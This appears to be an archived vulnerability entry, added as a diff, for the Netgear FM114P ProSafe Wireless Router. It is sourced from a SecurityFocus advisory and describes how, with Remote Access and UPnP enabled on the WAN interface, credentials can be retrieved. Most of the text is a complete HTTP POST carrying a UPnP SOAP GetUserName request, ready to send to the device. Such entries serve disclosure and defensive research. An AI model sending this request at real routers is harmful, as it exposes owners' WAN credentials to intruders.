@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/7267/info
+
+The Netgear FM114P ProSafe Wireless Router is vulnerable to information disclosure. If Remote Access and Universal Plug and Play are both enabled on the WAN interface, a UPnP SOAP request can retrieve the username and password for the WAN interface. 
+
+POST /upnp/service/WANPPPConnection HTTP/1.1
+HOST: 192.168.0.1:80
+SOAPACTION: "urn:schemas-upnp-org:service:WANPPPConnection:1#GetUserName"
+CONTENT-TYPE: text/xml ; charset="utf-8"
+Content-Length: 289
+
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
+xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
+<s:Body>
+<u:GetUserName
+xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1" />
+</s:Body>
+</s:Envelope> 
